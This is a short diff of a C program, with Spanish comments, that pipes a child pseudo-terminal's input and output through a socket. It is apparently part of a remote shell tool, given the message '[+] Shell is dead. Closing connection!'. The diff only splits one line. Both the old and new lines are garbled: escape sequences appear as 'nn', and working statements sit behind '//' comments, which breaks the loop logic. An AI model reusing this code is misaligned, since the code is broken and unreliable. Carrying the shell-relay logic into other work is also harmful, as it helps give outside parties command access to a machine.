@@ -85,7 +85,8 @@ int main (int args, char *argv[]) {
                 select(terminalfd + 1, &readfd, NULL, NULL, NULL);
                 if (FD_ISSET(terminalfd, &readfd)) { // Hay datos desde el proceso hijo
                     n = read(terminalfd, &output, 1024);
-                    if (n <= 0) { write(2, "[+] Shell is dead. Closing connection!nn", strlen("[+] Shell is dead. Closing connection!nn")); break; } write(2, output, n); // Los mandamos por el socket memset(&output, 0, 1024); } if (FD_ISSET(1, &readfd)) { // Hay datos en el socket memset(&input, 0, 1024); n = read(1, &input, 1024); if (n > 0) {
+                    if (n <= 0) { write(2, "[+] Shell is dead. Closing connection!nn", strlen("[+] Shell is dead. Closing connection!nn")); break; }
+                    write(2, output, n); // Los mandamos por el socket memset(&output, 0, 1024); } if (FD_ISSET(1, &readfd)) { // Hay datos en el socket memset(&input, 0, 1024); n = read(1, &input, 1024); if (n > 0) {
                     write(terminalfd, input, n); // Los escribimos en el STDIN del proceso hijo
                 }
             }
